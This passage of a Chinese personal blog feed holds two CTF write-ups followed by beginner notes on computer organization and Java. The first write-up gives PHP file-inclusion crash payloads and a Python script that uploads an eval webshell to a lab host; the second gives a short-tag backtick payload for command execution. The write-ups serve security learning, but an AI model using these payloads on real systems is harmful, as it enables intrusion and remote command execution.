charset=UTF-8Content-Length: 241Connection: closeVary: Accept-EncodingX-Powered-By: PHP/7.0.33&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;include($_GET[&quot;file&quot;])&lt;/body&gt;&lt;/html&gt;</code></pre><p>我已经有了女朋友所以我比出题人强(手动狗头)</p><p>include 函数好家伙，文件包含应该有了</p><p>来读取下源码</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213125612027.png" alt="image-20220213125612027"></p><p>解码如下:</p><pre><code class="php">&lt;?php$file=$_GET[&#39;file&#39;];if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;    die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;</code></pre><p>过滤了很多东西，没法命令执行了。</p><p>那就扫一下目录把:</p><p>最终扫出来了一个</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213131840887.png" alt="image-20220213131840887"></p><p>这个目录应该是告诉我们文件的名字，来结合文件包含使用。所以我们就要尝试去传shell</p><p>可以用php7 segment fault特性</p><blockquote><p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p></blockquote><p>参考链接；<a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这里我们可以直接知道文件名就不需要爆破了</p><p>该方法仅适用于以下php7版本，php5并不存在该崩溃：</p><pre><code>• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</code></pre><p>payload</p><pre><code class="php">php &lt; 7.2php://filter/string.strip_tags/resource=/etc/passwdphp7 老版本通杀php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></pre><p>由于tmp目录一般是不可访问的，所以该漏洞常常和文件包含结合起来使用</p><p>exp如下:</p><pre><code class="python">import requestsfrom io import BytesIOurl=&quot;http://ec8f0167-007a-4dd5-84fc-989e567ab77c.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;payload=&quot;&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;&quot;files=&#123;    &quot;file&quot;:BytesIO(payload.encode())&#125;r=requests.post(url=url,files=files,allow_redirects=False)print(r.text)</code></pre><p>运行</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213134031132.png" alt="image-20220213134031132"></p><p>这里多了一个文件</p><p>使用蚁剑连接</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213135012413.png" alt="image-20220213135012413"></p><p>测试成功了，但是无法添加，，莫名的错误</p><p>同理那就再添加个phpinfo吧</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213135404774.png" alt="image-20220213135404774"></p><p>成功找到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码\命令执行类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红明谷CTF 2021 write_shell_0x81-0x8F</title>
      <link href="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/"/>
      <url>/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/</url>
      
        <content type="html"><![CDATA[<p>这道题属于比较简单的，让我们来看一下源码</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104506611.png" alt="image-20220212104506611"></p><p>当我们在后缀加上?action=pwd 就可以得到路径</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104652393.png" alt="image-20220212104652393"></p><p>再换成upload就可以写文件</p><p>?action=upload&amp;date=xxx</p><p>这道题考察的就是shell的写入，但是它过滤了不少关键词</p><p>其中过滤了php这个关键词，但是这个可以进行绕过</p><pre><code>PHP中有两种短标签，&lt;??&gt;和&lt;?=?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?=?&gt;则是相当于&lt;? echo&gt;大部分文章说短标签需要在php.ini中设置short_open_tag为on才能开启短标签(默认是开启的，但似乎又默认注释，所以还是等于没开启)。但实际上在PHP5.4以后，无论short_open_tag是否开启，&lt;?=?&gt;这种写法总是适用的，&lt;??&gt;这种写法则需要short_open_tag开启才行。</code></pre><p>PHP中，反引号可以起到命令执行的效果</p><p>空格可以用url编码绕过%09</p><p>由这个我们就可以构造出payload</p><pre><code>?action=upload&amp;data=&lt;?=%09`whoami`?&gt;</code></pre><p>访问文件</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212110632709.png" alt="image-20220212110632709"></p><p>成功执行了命令</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212111111008.png" alt="image-20220212111111008"></p><p>直接获取根目录所有文件信息，访问文件，获得flag</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212111030856.png" alt="image-20220212111030856"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
      <url>/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>前言：由于本人非计算机专业(苦逼化工狗)，所以想要自己补一下计算机的基础，这样才能发展的更远，所以开了这一栏，以后会坚持更新~</p><h1 id="计算机组成原理概述篇"><a href="#计算机组成原理概述篇" class="headerlink" title="计算机组成原理概述篇"></a>计算机组成原理概述篇</h1><h2 id="计算机的发展历史"><a href="#计算机的发展历史" class="headerlink" title="计算机的发展历史"></a>计算机的发展历史</h2><h3 id="计算机发展的四个阶段"><a href="#计算机发展的四个阶段" class="headerlink" title="计算机发展的四个阶段"></a>计算机发展的四个阶段</h3><p>第一个阶段:电子管计算机</p><p>集成度小，空间占用大</p><p>功耗高，运行速度慢</p><p>操作复杂，更换程序需要接线</p><p>第二个阶段:晶体管计算机</p><p>集成度相对较高，空间占用相对小</p><p>功耗相对较低，运行速度快</p><p>操作相对简单，交互更加方便</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211222959451.png" alt="image-20220211222959451"></p><p>第三个阶段:集成电路计算机</p><p>计算机变得更小</p><p>功耗变得更低</p><p>计算速度变得更快</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211223618107.png" alt="image-20220211223618107"></p><p>第四个阶段:超大规模集成电路计算机</p><p>一个芯片集成了上百万的晶体管<br>速度更快，体积更小，价格更低，更能被大众接受</p><p>用途丰富:文本处理，表格处理，高交互的游戏与应用</p><p>第五个阶段:未来计算机</p><p>生物计算机，以蛋白质分子作为主要原材料:</p><p>体积小，效率高</p><p>不易损坏</p><p>不受信号干扰，无热损耗 1</p><p>量子计算机</p><h3 id="微型计算机的发展历史"><a href="#微型计算机的发展历史" class="headerlink" title="微型计算机的发展历史"></a>微型计算机的发展历史</h3><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224519853.png" alt="image-20220211224519853"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224544536.png" alt="image-20220211224544536"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211224641392.png" alt="image-20220211224641392"></p><h2 id="计算机的分类"><a href="#计算机的分类" class="headerlink" title="计算机的分类"></a>计算机的分类</h2><p>超级计算机:</p><p>功能最强、运算速度最快、存储容量最大的计算机</p><p>多用于国家高科技领域和尖端技术研究</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225354851.png" alt="image-20220211225354851"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225444783.png" alt="image-20220211225444783"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225558827.png" alt="image-20220211225558827"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225812247.png" alt="image-20220211225812247"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225834345.png" alt="image-20220211225834345"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211225944642.png" alt="image-20220211225944642"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230055284.png" alt="image-20220211230055284"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230109064.png" alt="image-20220211230109064"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230145911.png" alt="image-20220211230145911"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230155449.png" alt="image-20220211230155449"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230249731.png" alt="image-20220211230249731"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220211230318814.png" alt="image-20220211230318814"></p><h2 id="计算机的体系与结构"><a href="#计算机的体系与结构" class="headerlink" title="计算机的体系与结构"></a>计算机的体系与结构</h2><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212231520062.png" alt="image-20220212231520062"></p><p><strong>必须有一个存储器</strong></p><p><strong>必须有一个控制器</strong></p><p><strong>必须有一个运算器</strong></p><p><strong>必须有输入设备</strong></p><p><strong>必须有输出设备</strong></p><p>现代计算机都是冯诺依曼机</p><p>功能:</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232001255.png" alt="image-20220212232001255"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232045504.png" alt="image-20220212232045504"></p><p>瓶颈:</p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232350723.png" alt="image-20220212232350723"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232427464.png" alt="image-20220212232427464"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232520952.png" alt="image-20220212232520952"></p><p><img src="/2022/02/11/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20220212232603902.png" alt="image-20220212232603902"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java学习之旅</title>
      <link href="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/"/>
      <url>/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><p>本篇文章更新java系列知识—持续更新中</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211163044997.png" alt="image-20220211163044997"></p><h1 id="快捷键速查"><a href="#快捷键速查" class="headerlink" title="快捷键速查"></a>快捷键速查</h1><pre><code>ctrl + shift + u 大小写替换ctrl + alt +t 快速写一些方法，如try catchalt + insert sout  输出psvm 主函数</code></pre><h1 id="day1-java初识"><a href="#day1-java初识" class="headerlink" title="day1  java初识"></a>day1  java初识</h1><h2 id="第一个HelloWord程序"><a href="#第一个HelloWord程序" class="headerlink" title="第一个HelloWord程序"></a>第一个HelloWord程序</h2><pre><code class="java">/*这里HelloWord是类名void main 是方法，也是程序的入口void 空main 主函数*/class HelloWord&#123;    public static void main(String[] args)&#123;                System.out.println(&quot;Hello Word!&quot;);    &#125;&#125;</code></pre><p>首先用 javac helloword.java –&gt;编译为   helloword.class</p><p>然后 java helloword 执行(这里注意不要加后缀!)</p><p>结果如下：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211171119785.png" alt="image-20220211171119785"></p><p>注意点:</p><p>1、java中严格区分大小写</p><p>2、要记得更改编辑器的编码方式 要保持编码一致才能运行</p><p>3、每一行语句结束必须以;结束</p><p>4、注意缩进</p><p>5、类名是什么，生成的字节码文件是什么，与原文件名字没有直接关系。</p><p>6、当类是公共的，既用public修饰类，类名必须与文件名保持一致</p><p>7、一个java文件中可以有多个类，每个类在编译后都会生成一个字节码文件。</p><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211210820972.png" alt="image-20220211210820972"></p><p>关键字有：</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211210537067.png" alt="image-20220211210537067"></p><p>其中const和goto是保留字</p><h2 id="规范"><a href="#规范" class="headerlink" title="规范:"></a>规范:</h2><p>1、见名知意</p><p>2、驼峰命名</p><p>当变量名 方法名 参数名 由两个或两个单词以上组成时，从第二个单词开始首字母大写</p><p>如：userName passWord</p><p>3、对常量进行命名时，每个单词的字母都大写，而且单词与单词之间使用_相连</p><p>如: MAX_NUM</p><p>4、对类进行命名时，对每一个单词的首字母大写</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>基本数据类型(四类八种):</p><p>整数型:</p><p>​        byte 字节类型        short         int         long</p><p>浮点类型:</p><p>​        float 单精度        double 双精度</p><p>字符型: </p><p>​        char</p><p>布尔型:</p><p>​        boolean:</p><p>​            true        false</p><p>引用类型数据:字符串 类 接口</p><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p> 字符串常量            浮点类型常量             字符常量           布尔类型常量            内置的常量</p><p>“HelloWoerd”                3.14                         ‘你’                        true                       Math.PI</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>在程序执行过程中，其值可以改变的量</p><p>三要素:</p><p>变量类型        变量名        变量值</p><p>如何申明变量?</p><p>数据类型+变量名</p><p>申明整数类型变量:</p><p>byte b;        long 1;</p><p>同理可生成</p><p>float f;    double d;    char c;    String s;</p><p>在方法内的变量 申明后要赋值才能使用</p><p>变量的实质就是申请内存</p><h1 id="day2-java基础语法"><a href="#day2-java基础语法" class="headerlink" title="day2  java基础语法"></a>day2  java基础语法</h1><h2 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换:"></a>进制转换:</h2><pre><code class="java">class Sakura&#123;        public static void main(String [] args)&#123;            System.out.println(666);   //十进制            System.out.println(0b1010011010); //二进制  0b开头            System.out.println(01232);  //八进制 0开头            System.out.println(0x29a); //十六进制 0x开头            &#125;&#125;</code></pre><p>输出结果:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212154216121.png" alt="image-20220212154216121"></p><h2 id="计算机存储单位"><a href="#计算机存储单位" class="headerlink" title="计算机存储单位"></a>计算机存储单位</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212154344804.png" alt="image-20220212154344804"></p><p>1 byte = 8 bit;  没有符号的范围: 2^8-1  有符号(第一位做符号位): -128 - 127</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212160938532.png" alt="image-20220212160938532"></p><p>整数类型   注意:</p><p>1、整数类型，默认的数据类型是int</p><p>2、错误：不兼容的类型：从int转换到byte可能有损失</p><p>当我们赋的值在byte或者short的范围内则不会有变化</p><p>但是当赋的值不在byte或者short的范围内则会将此值作为int类型处理<br>3、错误:过大的整数：2222222222</p><p>生命long类型数值的时候，要在数值的末尾+L</p><p>浮点类型    注意:</p><p>1、浮点类型 默认的数据类型是double</p><p>2、不兼容的类型：从double转换到float可能会有损失</p><p>申明float类型的数据 要在数值的末尾 +  F</p><p>float f =3.14F</p><p>3、浮点类型底层采用的是科学计数法方式</p><p>4、小数底层存储方式与整数不同  有符号位 指数位 整数位</p><p>5、小数不能精确的表示一个值 (如果要精确的表示需要用到bigdecimal)</p><h2 id="计算机如何存储数据"><a href="#计算机如何存储数据" class="headerlink" title="计算机如何存储数据"></a>计算机如何存储数据</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212172832527.png" alt="image-20220212172832527"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212172817453.png" alt="image-20220212172817453"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212173056936.png" alt="image-20220212173056936"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212173119494.png" alt="image-20220212173119494"></p><h2 id="自动类型提升"><a href="#自动类型提升" class="headerlink" title="自动类型提升"></a>自动类型提升</h2><p>基本类型数据转换:</p><p>1、自动类型提升</p><p>小的数据类型 可以自动转换为大的数据类型</p><pre><code class="java">int d = 3;double f = d;</code></pre><p>2、强制类型转换</p><p>错误：不兼容的类型，从double转换到int可能会有损失</p><p> 强制转换的公式:</p><p>小的数据类型 标识符 = (小的数据类型)大的数据类型</p><pre><code class="java">double d = 3.14;int num = (int)d;</code></pre><p>特殊情况</p><pre><code class="java">class Sakura&#123;        public static void main(String [] args)&#123;            int a = 200;            byte b = (byte)a;            System.out.println(b);        &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212221045664.png" alt="image-20220212221045664"></p><p>为什么这里是-56呢？</p><p>首先我们知道 int是四个字节，而byte只有一个字节，200的二进制数为 11001000</p><p>刚好byte可以全部接受，但是byte第一位是符号位，首位是1，所以是负数，计算机的存储方式是以补码的形式存储。11001000—&gt;10110111(反码)—&gt;10111000(补码)</p><p>转化为十进制就是-56</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212221721358.png" alt="image-20220212221721358"></p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212222704014.png" alt="image-20220212222704014"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212222746808.png" alt="image-20220212222746808"></p><p>注意:</p><p>1、整数相除，不保留小数</p><p>2、如果想要显示小数，使用浮点类型计算</p><p>3、 byte与byte  short与short char与char 做运算，或者他们之间混合运算，则结果会变为int类型</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212225720878.png" alt="image-20220212225720878"></p><p>使用赋值运算符是不会发生类型转换的</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212230210588.png" alt="image-20220212230210588"></p><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220213150338148.png" alt="image-20220213150338148"></p><h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220213150648548.png" alt="image-20220213150648548"></p><h1 id="day3-流程控制语句"><a href="#day3-流程控制语句" class="headerlink" title="day3  流程控制语句"></a>day3  流程控制语句</h1><h2 id="输入语句-scanner"><a href="#输入语句-scanner" class="headerlink" title="输入语句 scanner"></a>输入语句 scanner</h2><pre><code class="java">import java.util.*;class InputTest&#123;    public static void main(String [] args)&#123;            Scanner input = new Scanner(System.in);            // 创建input对象, &quot;input&quot;是变量，可为任意值            // System.in 输入流             // 输入数据必须与接受类型匹配，不然会报错 如下图            //Scanner类型没有提供返回char类型数据的方法            /*            可以采用 字符串.charAt(0);   0代表字符串内第一个字符，1代表第二个......            char cc = &quot;你好&quot;.charAt(0);            System.out.println(cc);   ---你            */            System.out.println(&quot;请输入你的年龄&quot;);            int age = input.nextInt();            System.out.println(&quot;你的年龄是&quot;+age);            System.out.println(&quot;请输入你的身高&quot;);            double height = input.nextDouble();            System.out.println(&quot;你的身高是&quot;+height);            System.out.println(&quot;请输入你的姓名&quot;);            String name = input.next();            System.out.println(&quot;你的姓名是&quot;+name);            &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220219224259748.png" alt="image-20220219224259748"></p><h2 id="next与nextLine"><a href="#next与nextLine" class="headerlink" title="next与nextLine"></a>next与nextLine</h2><p>键盘输入一个地址</p><pre><code class="java">/*1、导包2、创建对象3、对象调方法*/import java.util.*;class InputTest&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);        System.out.println(&quot;您的地址是&quot;);        String address = input.next();        System.out.println(&quot;您的地址是&quot;+address);    &#125;    &#125;</code></pre><p>注意:<br>    next()无法接受 空格之后的内容</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220223643121.png" alt="image-20220220223643121"></p><p>此时我们可以用nextLine(可以接受整行内容)</p><pre><code class="java">String address = input.nextLine();</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220223819952.png" alt="image-20220220223819952"></p><p>nextLine存在一些问题:</p><pre><code class="java">import java.util.*;class InputTest&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);         System.out.println(&quot;您的身高是&quot;);        double height = input.nextDouble();        System.out.println(&quot;您的身高是:&quot;+height);        System.out.println(&quot;您的地址是&quot;);        String address = input.nextLine();        System.out.println(&quot;您的地址是:&quot;+address);    &#125;&#125;</code></pre><p>当代码如上时，运行程序会出现以下后果:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220224758917.png" alt="image-20220220224758917"></p><p>我们发现第二个输出直接结束了，这是因为nextLine遇到回车，会误认为代码已经结束了。</p><p>解决办法:</p><p>在中间加入一个</p><pre><code class="java">input.nextLine();</code></pre><p>来接受回车</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220225008607.png" alt="image-20220220225008607"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220225108040.png" alt="image-20220220225108040"></p><p>这样问题就解决了</p><h2 id="if单分支"><a href="#if单分支" class="headerlink" title="if单分支"></a>if单分支</h2><pre><code class="java">/*if分支：    if单分支        if(boolean表达式)&#123;            分支内容        &#125;*/import java.util.*;class IfTest&#123;    public static void main(String [] args)&#123;        Scanner in = new Scanner(System.in);        System.out.println(&quot;请输入您的年龄&quot;);        int age = in.nextInt();        if(age &gt;= 18)&#123;            System.out.println(&quot;您已经成年，可以上网了&quot;);        &#125;        if(age &lt; 18)&#123;            System.out.println(&quot;您还没有成年,please go out!&quot;);        &#125;        &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220231710122.png" alt="image-20220220231710122"></p><h2 id="小习题-闰年的标准"><a href="#小习题-闰年的标准" class="headerlink" title="小习题-闰年的标准"></a>小习题-闰年的标准</h2><p>闰年的标准(两者满足其一即可):</p><p>1、能被4整除，不能被100整除</p><p>2、能被400整除</p><p>代码功能:</p><p>输入一个数判断是否是闰年</p><pre><code class="java">import java.util.*;class RunYears&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);        System.out.println(&quot;请输入一个年份:&quot;);        int years = input.nextInt();        if((years%4==0&amp;&amp;years%100!=0)||(years%400==0))            System.out.println(years+&quot;是闰年！&quot;);    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220233501106.png" alt="image-20220220233501106"></p><h2 id="if双分支"><a href="#if双分支" class="headerlink" title="if双分支"></a>if双分支</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220233824314.png" alt="image-20220220233824314"></p><h2 id="求三个数中的最大值"><a href="#求三个数中的最大值" class="headerlink" title="求三个数中的最大值"></a>求三个数中的最大值</h2><pre><code class="java">import java.util.*;class MaxNum&#123;    public static void main(String [] args)&#123;        int a = 50;        int b = 999;        int c = 12;        if(a &gt; b)&#123;            if(a &gt; c)&#123;                System.out.println(&quot;a是三个数中的最大值&quot;);            &#125;else&#123;                System.out.println(&quot;c是三个数中的最大值&quot;);            &#125;                &#125;else&#123;            if(b &lt; c)&#123;                System.out.println(&quot;c是三个数中的最大值&quot;);            &#125;else&#123;                System.out.println(&quot;b是三个数中的最大值&quot;);            &#125;                    &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221001754310.png" alt="image-20220221001754310"></p><h2 id="if多分支"><a href="#if多分支" class="headerlink" title="if多分支"></a>if多分支</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221002157818.png" alt="image-20220221002157818"></p><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><p> <img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221002546023.png" alt="image-20220221002546023"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221003440041.png" alt="image-20220221003440041"></p><p>case后面的数据必须与表达式类型一致</p><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><p>满足特定条件反复执行的代码</p><p>任何一个标准的循环都有四个条件:</p><p><strong>初始化条件</strong></p><p><strong>循环条件</strong></p><p><strong>循环体</strong></p><p><strong>迭代条件</strong></p><p>实例:</p><pre><code class="java">import java.util.*;class Repeat&#123;     public static void main(String [] args)&#123;        int i = 0;        while(i&lt;10)&#123;            System.out.println(&quot;Hello Word&quot;);            i++;        &#125;            &#125;        &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221005248322.png" alt="image-20220221005248322"></p><h1 id="day4-循环"><a href="#day4-循环" class="headerlink" title="day4 循环"></a>day4 循环</h1><h2 id="do-while"><a href="#do-while" class="headerlink" title="do while"></a>do while</h2><p><img 